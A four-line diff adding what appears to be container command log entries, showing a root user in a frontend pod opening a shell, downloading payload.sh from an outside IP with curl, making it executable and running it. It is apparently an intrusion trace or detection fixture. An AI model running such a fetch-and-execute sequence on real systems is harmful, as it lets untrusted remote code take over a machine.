@@ -1,0 +1,4 @@
+2025-02-12T03:14:11Z pod=frontend-7d9f8 container=app user=root cmd=/bin/bash
+2025-02-12T03:14:22Z pod=frontend-7d9f8 container=app user=root cmd=curl http://185.234.218.11/payload.sh
+2025-02-12T03:14:40Z pod=frontend-7d9f8 container=app user=root cmd=chmod +x payload.sh
+2025-02-12T03:14:55Z pod=frontend-7d9f8 container=app user=root cmd=./payload.sh
